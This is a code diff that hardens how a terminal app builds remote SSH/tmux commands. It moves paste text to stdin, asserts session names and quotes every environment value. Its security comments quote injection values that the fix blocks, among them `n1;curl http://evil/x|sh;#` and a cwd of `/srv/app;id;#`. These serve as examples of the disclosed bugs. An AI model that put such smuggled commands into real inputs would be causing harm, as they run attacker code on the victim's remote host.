@@ -4,9 +4,17 @@ import os from 'os'
 import path from 'path'
 import { createHash } from 'crypto'
 import { posixQuote, quoteRemotePath, remoteTmuxCommand, type SshConnection } from '../../shared/ssh'
-import { TMUX_SOCKET } from '../tmux-naming'
+import {
+  TMUX_SOCKET,
+  assertFramedPayload,
+  assertPasteTarget,
+  assertPasteBuffer,
+  pasteBufferName,
+  type PasteDelivery
+} from '../tmux-naming'
+import { sanitizePasteText } from '../paste-injection'
 import { canControlCanvas } from '../../shared/agents/config'
-import { bracketedInjection } from '../paste-injection'
+import { PANE_OWNER_FMT, foregroundArgvArgs } from '../agents/pane-owner'
 // Dependency-free (no node-pty): safe to import from these pure builders.
 
 /** Dedicated remote tmux socket so an SSH project never collides with the user's own tmux. */
@@ -210,36 +218,157 @@ export function parseRemoteSessionNames(stdout: string): string[] {
 }
 
 /**
- * Send literal text (and optionally Enter) into a node's REMOTE tmux session — the remote
- * counterpart of `PtyManager.sendText`'s local `tmux send-keys` path (dictation insert, /rename,
- * /branch, note pushes). Built as ONE remote command so everything runs strictly in order on
- * the remote host without a second network round trip: `-l --` sends the text literally (`-l`)
- * and stops option parsing first (`--`, so text starting with `-` is never read as another
- * send-keys flag); `text` is single-quoted (`posixQuote`) so it survives the remote shell as one
- * token verbatim, multiline included.
+ * Deliver text (and optionally Enter) into a node's REMOTE tmux session — the remote counterpart
+ * of `PtyManager.sendText`'s local path (dictation insert, /rename, /branch, note pushes). ONE
+ * remote command, so everything runs strictly in order on the remote host with no second network
+ * round trip.
  *
- * Mirrors the local path's paste-aware delivery (`PtyManager.sendText`, issue #47): when the
- * remote pane's application requested bracketed-paste mode (`bracket_paste_flag`), the text is
- * framed in paste markers with the Enter appended in the SAME send-keys, so a re-chunking
- * middle layer (e.g. the herdr multiplexer) can never absorb the Enter into the paste. The
- * quoted body carries raw ESC/CR bytes — inside single quotes they reach tmux verbatim.
- * Otherwise the legacy two-step send runs, joined with `&&`, not `;`: Enter only fires if the
- * text send actually succeeded, so a failed text send can never leave a lone Enter to submit
- * whatever was already composed in a live agent prompt.
+ * THE TEXT IS NOT IN THIS ARGV. It rides the ssh child's STDIN into `tmux load-buffer -b … -`.
+ * Two reasons, and both of them bit the previous version:
+ *
+ *  - ARG_MAX. `set-buffer -- "$text"` / `send-keys -l -- '<text>'` puts the whole payload in one
+ *    argument, and a single argument is capped at MAX_ARG_STRLEN (128 KB). Measured locally: a
+ *    300 KB payload dies with "Argument list too long"; the same payload through `load-buffer -`
+ *    lands intact. A scrollback paste or a long note push is not a hypothetical size.
+ *  - This repo's standing rule: no payload on a command line. It also retires the `posixQuote`
+ *    of an attacker-influenced body into a remote shell line entirely — there is nothing left to
+ *    quote.
+ *
+ * FRAMING is tmux's job now, not ours. See `localTmuxPasteArgs` for the whole measurement: the
+ * old `#{bracket_paste_flag}` conditional needed tmux 3.7 on the REMOTE host and silently
+ * degraded to a raw-newline mangle on every older one, while `paste-buffer -p` has consulted the
+ * pane's real bracketed-paste state since tmux 1.7 (2012). The remote host's tmux version stops
+ * being something this feature depends on.
+ *
+ * `sanitizePasteText` still runs — at the CALLER (`PtyManager.sendText`), once, for both paths,
+ * on the bytes that go down stdin. tmux inserting the frame does not make a payload-supplied
+ * `ESC[201~` harmless: it would still close the frame early and turn the rest into key input.
+ *
+ * The `#{pane_in_mode}` format and the inner `send-keys` command string are single-quoted so the
+ * remote SHELL passes them through verbatim — `#…` at the start of a word is a comment to sh, and
+ * the inner command is one tmux argument. `sessionId` is spliced unquoted, exactly as every
+ * sibling builder here does, and that is safe only because `sessionName()` sanitises to
+ * `[A-Za-z0-9_-]`; `localTmuxPasteArgs` asserts it for both paths (`assertPasteTarget`).
  */
-export function remoteTmuxSendKeysArgs(
+export function remoteTmuxPasteArgs(
+  conn: SshConnection,
+  controlPath: string,
+  sessionId: string,
+  buffer: string,
+  enter: boolean
+): string[] {
+  assertPasteTarget(sessionId, buffer)
+  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
+  let cmd =
+    `${tmux} load-buffer -b ${buffer} - ';' ` +
+    `if-shell -F -t ${sessionId} '#{pane_in_mode}' 'send-keys -t ${sessionId} -X cancel' ';' ` +
+    `paste-buffer -d -p -r -b ${buffer} -t ${sessionId}`
+  if (enter) cmd += ` ';' send-keys -t ${sessionId} Enter`
+  return childArgs(conn, controlPath, cmd)
+}
+
+/**
+ * The remote leg of the messaging envelope's delivery — `remoteFramedDelivery`'s argv. The exact
+ * mirror of `localTmuxFramedPasteArgs` (tmux-naming.ts): NO `-p`, because the payload already
+ * carries its frame and tmux re-framing it would render the inner markers as garbage; `-r` so the
+ * bytes land verbatim; no trailing Enter, because the composed `\r` rides inside the paste.
+ */
+export function remoteTmuxFramedPasteArgs(
+  conn: SshConnection,
+  controlPath: string,
+  sessionId: string,
+  buffer: string
+): string[] {
+  assertPasteTarget(sessionId, buffer)
+  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
+  const cmd =
+    `${tmux} load-buffer -b ${buffer} - ';' ` +
+    `if-shell -F -t ${sessionId} '#{pane_in_mode}' 'send-keys -t ${sessionId} -X cancel' ';' ` +
+    `paste-buffer -d -r -b ${buffer} -t ${sessionId}`
+  return childArgs(conn, controlPath, cmd)
+}
+
+/**
+ * The plan for delivering one composed frame remotely — same three decisions as
+ * `localFramedDelivery`, taken by the SAME `assertFramedPayload` rather than restated: this is the
+ * one plan pair that does not sanitize (the frame's ESC bytes must survive), so it refuses
+ * anything that is not `bracketedInjection` output. No bare-Enter case: an envelope is never
+ * empty, and a lone Enter into an agent's composer is an accidental submit.
+ */
+export function remoteFramedDelivery(
+  conn: SshConnection,
+  controlPath: string,
+  sessionId: string,
+  payload: string
+): PasteDelivery | null {
+  if (payload.length === 0) return null
+  assertFramedPayload(payload)
+  const buffer = pasteBufferName()
+  return {
+    args: remoteTmuxFramedPasteArgs(conn, controlPath, sessionId, buffer),
+    body: payload,
+    cleanup: remoteDeleteBufferArgs(conn, controlPath, buffer)
+  }
+}
+
+/**
+ * A bare Enter into the remote pane — the remote half of `sendText`'s empty-payload case.
+ *
+ * It is not a special case invented here: `sendText('', { enter: true })` means "submit whatever
+ * is composed", and the legacy two-step did exactly this (an empty literal send is a no-op, then
+ * the Enter). It has to bypass `remoteTmuxPasteArgs` because `load-buffer -` given zero bytes
+ * creates NO buffer, so the `paste-buffer` after it fails and tmux abandons the rest of the
+ * command list — including the Enter. Measured.
+ *
+ * `sessionId` is spliced unquoted like every sibling, and — as of review — asserted like every
+ * sibling. It was the one new builder in this change that opted out. Unreachable today, because
+ * `sessionName()` sanitises to `[A-Za-z0-9_-]` before anything gets here, but a splice that is
+ * safe only because some caller upstream happens to be strict is one refactor from an injection,
+ * and this PR's own rule is that the guarantee lives at the splice.
+ */
+export function remoteTmuxEnterArgs(
+  conn: SshConnection,
+  controlPath: string,
+  sessionId: string
+): string[] {
+  assertPasteTarget(sessionId)
+  return childArgs(conn, controlPath, `tmux -L ${RMT_TMUX_SOCKET} send-keys -t ${sessionId} Enter`)
+}
+
+/** `delete-buffer` on the REMOTE server — the sweep for a remote paste that never ran. */
+export function remoteDeleteBufferArgs(
+  conn: SshConnection,
+  controlPath: string,
+  buffer: string
+): string[] {
+  assertPasteBuffer(buffer)
+  return childArgs(conn, controlPath, `tmux -L ${RMT_TMUX_SOCKET} delete-buffer -b ${buffer}`)
+}
+
+/**
+ * The plan for a REMOTE delivery — the exact mirror of `localPasteDelivery`, and deliberately the
+ * same three decisions (sanitize, empty body, per-call buffer) taken by calling the SAME code
+ * rather than by writing them out again here. Drift between the two legs is how the ESC rule
+ * survived being missing on one of them once already.
+ */
+export function remotePasteDelivery(
   conn: SshConnection,
   controlPath: string,
   sessionId: string,
   text: string,
   enter: boolean
-): string[] {
-  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
-  const framed = `${tmux} send-keys -t ${sessionId} -l -- ${posixQuote(bracketedInjection(text, enter))}`
-  let legacy = `${tmux} send-keys -t ${sessionId} -l -- ${posixQuote(text)}`
-  if (enter) legacy += ` && ${tmux} send-keys -t ${sessionId} Enter`
-  const cmd = `if [ "$(${tmux} display-message -p -t ${sessionId} '#{bracket_paste_flag}' 2>/dev/null)" = 1 ]; then ${framed}; else ${legacy}; fi`
-  return childArgs(conn, controlPath, cmd)
+): PasteDelivery | null {
+  const body = sanitizePasteText(text)
+  if (body.length === 0) {
+    if (!enter) return null
+    return { args: remoteTmuxEnterArgs(conn, controlPath, sessionId), body: '', cleanup: null }
+  }
+  const buffer = pasteBufferName()
+  return {
+    args: remoteTmuxPasteArgs(conn, controlPath, sessionId, buffer, enter),
+    body,
+    cleanup: remoteDeleteBufferArgs(conn, controlPath, buffer)
+  }
 }
 /**
  * Did a FAILED `tmux has-session` probe actually say the session is absent? Only tmux's own
@@ -348,7 +477,7 @@ export function remoteCapturePaneArgs(conn: SshConnection, controlPath: string, 
  * Ask the REMOTE tmux which command is in the foreground of a node's pane — the remote
  * counterpart of `PtyManager.paneCommand`'s local `display-message` path. The format is
  * single-quoted so `#{…}` survives the remote shell verbatim (same idiom as the
- * `bracket_paste_flag` probe in `remoteTmuxSendKeysArgs`).
+ * `#{pane_in_mode}` gate in `remoteTmuxPasteArgs`).
  */
 export function remotePaneCommandArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
   return childArgs(
@@ -357,6 +486,43 @@ export function remotePaneCommandArgs(conn: SshConnection, controlPath: string, 
     `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{pane_current_command}'`
   )
 }
+/**
+ * Ask the REMOTE tmux for everything the ownership read needs in one round-trip — the remote
+ * counterpart of `PtyManager.paneOwner`'s first call. Same single-quoting rule as
+ * `remotePaneCommandArgs`: the `#{…}` fields have to reach the remote tmux verbatim rather than
+ * being eaten by the remote shell.
+ */
+export function remotePaneOwnerArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
+  return childArgs(
+    conn,
+    controlPath,
+    `tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '${PANE_OWNER_FMT}'`
+  )
+}
+
+/**
+ * The second round-trip: `ps` on the REMOTE host, listing the pane tty's processes.
+ *
+ * `tty` is a value the remote host printed back at us (`#{pane_tty}`), so it is DATA crossing into
+ * a command line — exactly the class `remote-safety.ts` exists for. Two layers, both required:
+ * `isSafeTty` refuses anything outside `[A-Za-z0-9/._-]` (returning null here, which the caller
+ * reads as "unknown"), and what survives is `posixQuote`d at the splice. No credential is involved
+ * — a tty path is the whole payload — so nothing here needs, or may grow, a stdin header channel
+ * (Global Constraint 6).
+ *
+ * The `ps` flags are the ones measured for the local leg, unchanged: they are valid on both GNU and
+ * BSD `ps`, and the remote host is at least as likely to be either.
+ */
+export function remoteForegroundArgvArgs(
+  conn: SshConnection,
+  controlPath: string,
+  tty: string
+): string[] | null {
+  const call = foregroundArgvArgs(tty)
+  if (!call) return null
+  return childArgs(conn, controlPath, `${call.bin} ${call.args.map(posixQuote).join(' ')}`)
+}
+
 /**
  * Ask the REMOTE tmux where a pane's cursor is — the remote counterpart of `PtyManager.paneCursor`,
  * and the thing that makes a refreshed SSH terminal land its cursor in the right place. Same
@@ -477,14 +643,37 @@ export function remoteHookEnvArgs(
   return env
 }
 /** Contents of the remote endpoint env file the managed hook script sources (unix-socket transport). */
-export function remoteEndpointFileContents(sock: string, token: string, version: string): string {
-  return `NODETERM_HOOK_SOCK=${sock}\nNODETERM_HOOK_TOKEN=${token}\nNODETERM_HOOK_VERSION=${version}\n`
+export function remoteEndpointFileContents(
+  sock: string,
+  token: string,
+  version: string,
+  tokenDir: string
+): string {
+  return (
+    `NODETERM_HOOK_SOCK=${sock}\n` +
+    `NODETERM_HOOK_TOKEN=${token}\n` +
+    `NODETERM_HOOK_VERSION=${version}\n` +
+    // The REMOTE token dir ($HOME/.nodeterm/node-tokens on the host), not ours. The host stores
+    // per-node tokens only; it never holds a secret and can never mint.
+    `NODETERM_NODE_TOKEN_DIR=${tokenDir}\n`
+  )
 }
 
 /**
  * The remote PTY program is `ssh <childArgs> host -t '<remoteTmuxCommand>'`. `extraEnv` is an
  * already-built list of tmux `-e KEY=VALUE` pairs (e.g. from `remoteHookEnvArgs`) spliced into
  * the `new-session` command right after `-A`, mirroring the local tmux `-e` placement.
+ *
+ * SECURITY — every token is `posixQuote`d, including the `-e` flags themselves (quoting a flag is
+ * a no-op to the shell, and hard-coding "even indices are flags" would be an assumption about a
+ * caller's array shape rather than a property of this function). This is NOT decoration: the
+ * result is ONE SHELL LINE handed to the remote user's login shell, and the values here carry the
+ * RAW node id (`NODETERM_NODE_ID`) and the managed-account config dir — both of which come out of
+ * `.nodeterm/project.json`, a file that travels in a cloned or shared repo and is written on
+ * remote hosts. Spliced unquoted (as this did until 2026-08), a node id of
+ * `n1;curl http://evil/x|sh;#` ended the tmux command and ran the rest as the SSH user the moment
+ * the victim opened that node. Everything else in `remoteTmuxCommand` was already quoted; this was
+ * the one gap. See control-master.injection.test.ts.
  */
 export function remoteTmuxPtyArgs(
   conn: SshConnection,
@@ -497,6 +686,15 @@ export function remoteTmuxPtyArgs(
   confPath?: string
 ): string[] {
   let cmd = remoteTmuxCommand({ sessionId, remoteCwd, program, programArgs, socket: RMT_TMUX_SOCKET, confPath })
-  if (extraEnv.length) cmd = cmd.replace('new-session -A ', `new-session -A ${extraEnv.join(' ')} `)
+  if (extraEnv.length)
+    // The replacement is a FUNCTION, not a string. This is load-bearing and not a style choice:
+    // in a STRING replacement `$'`, `` $` ``, `$&` and `$$` are expansion patterns, and `$'`
+    // splices the text FOLLOWING the match — `-s '<session>' -c '<cwd>' '<program>' '<args>'` —
+    // straight INSIDE the single-quoted token being built. That inverts the quote parity of that
+    // copy and un-quotes everything `remoteTmuxCommand` had carefully quoted, so an agent id of
+    // `claude$'` plus a project cwd of `/srv/app;id;#` (both from the same `.nodeterm/project.json`)
+    // was remote code execution EVEN WITH the posixQuote above. A function replacement is never
+    // pattern-expanded, so the quoted bytes land verbatim. See control-master.injection.test.ts.
+    cmd = cmd.replace('new-session -A ', () => `new-session -A ${extraEnv.map(posixQuote).join(' ')} `)
   return ['-t', ...childArgs(conn, controlPath, cmd)]
 }
